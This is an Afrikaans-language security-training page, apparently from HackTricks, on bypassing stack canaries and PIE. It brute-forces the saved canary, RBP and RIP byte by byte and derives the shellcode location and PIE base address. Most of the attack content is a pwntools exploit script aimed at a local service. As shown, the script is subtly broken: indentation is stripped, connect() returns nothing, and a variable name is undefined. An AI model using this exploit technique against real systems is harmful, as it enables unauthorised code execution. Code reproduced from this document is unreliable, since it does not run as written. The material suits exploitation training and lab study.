# BF Adresse in die Stapel

{{#include ../../../../banners/hacktricks-training.md}}

**As jy 'n binêre teëkom wat deur 'n canary en PIE (Position Independent Executable) beskerm word, moet jy waarskynlik 'n manier vind om dit te omseil.**

![](<../../../../images/image (144).png>)

> [!NOTE]
> Let daarop dat **`checksec`** dalk nie sal vind dat 'n binêre deur 'n canary beskerm word as dit staties gecompileer is nie en dit nie in staat is om die funksie te identifiseer.\
> Jy kan egter dit handmatig opgemerk as jy vind dat 'n waarde in die stapel gestoor word aan die begin van 'n funksie-aanroep en hierdie waarde word nagegaan voordat dit verlaat.

## Brute-Force Adres

Om die PIE te omseil, moet jy **'n adres lek**. En as die binêre nie enige adresse lek nie, is die beste manier om dit te doen om die **RBP en RIP wat in die stapel gestoor is** in die kwesbare funksie te brute-force.\
Byvoorbeeld, as 'n binêre beskerm word met beide 'n **canary** en **PIE**, kan jy begin om die canary te brute-force, dan sal die **volgende** 8 Bytes (x64) die gestoor **RBP** wees en die **volgende** 8 Bytes sal die gestoor **RIP** wees.

> [!TIP]
> Dit word veronderstel dat die terugadres binne die stapel aan die hoof binêre kode behoort, wat, as die kwesbaarheid in die binêre kode geleë is, gewoonlik die geval sal wees.

Om die RBP en die RIP van die binêre te brute-force, kan jy uitvind dat 'n geldige geraamde byte korrek is as die program iets uitset of dit net nie crash nie. Die **dieselfde funksie** soos die wat voorsien is vir die brute-forcing van die canary kan gebruik word om die RBP en die RIP te brute-force:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Die laaste ding wat jy nodig het om die PIE te oorwin, is om **nuttige adresse uit die gelekte** adresse te bereken: die **RBP** en die **RIP**.

Van die **RBP** kan jy bereken **waar jy jou shell in die stapel skryf**. Dit kan baie nuttig wees om te weet waar jy die string _"/bin/sh\x00"_ binne die stapel gaan skryf. Om die afstand tussen die gelekte RBP en jou shellcode te bereken, kan jy net 'n **breakpoint plaas na die RBP gelekt is** en kyk **waar jou shellcode geleë is**, dan kan jy die afstand tussen die shellcode en die RBP bereken:
```python
INI_SHELLCODE = RBP - 1152
```
Van die **RIP** kan jy die **basisadres van die PIE-binary** bereken wat jy gaan benodig om 'n **geldige ROP-ketting** te skep.\
Om die basisadres te bereken, doen net `objdump -d vunbinary` en kyk na die ontsyferde jongste adresse:

![](<../../../../images/image (145).png>)

In daardie voorbeeld kan jy sien dat slegs **1 Byte en 'n half benodig word** om al die kode te lokaliseer, dan sal die basisadres in hierdie situasie die **gelekte RIP wees maar eindig op "000"**. Byvoorbeeld, as jy `0x562002970ecf` gelek het, is die basisadres `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
{{#include ../../../../banners/hacktricks-training.md}}
